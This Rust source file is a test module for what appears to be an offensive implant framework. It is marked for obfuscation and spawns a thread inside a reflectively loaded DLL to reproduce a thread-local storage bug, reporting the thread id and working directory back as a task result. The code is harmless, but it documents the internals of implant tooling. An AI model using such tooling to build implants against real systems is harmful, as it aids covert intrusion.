use crate::prelude::*;

pub struct ThreadSpawnTest {}

#[async_trait]
#[module_impl("thread_spawn_test")]
impl Module for ThreadSpawnTest {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for ThreadSpawnTest {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let _ = check_request!(receiver, Body::Request)?;

        let mut response = Response::default();

        // Spawn a std::thread inside the PE-loaded DLL — this is the
        // scenario that triggers the TLS thread_info assertion:
        //   "assertion failed: thread_info.stack_guard.get().is_none()
        //    && thread_info.thread.get().is_none()"
        let handle = std::thread::spawn(|| {
            let mut result = String::new();
            result.push_str("thread_id=");
            result.push_str(&format!("{:?}", std::thread::current().id()));
            result.push_str(" cwd=");
            result.push_str(
                &std::env::current_dir()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_else(|e| format!("err:{}", e)),
            );
            result
        });

        match handle.join() {
            Ok(output) => {
                response.output = output;
            }
            Err(e) => {
                response.output = format!("thread panic: {:?}", e);
            }
        }

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}
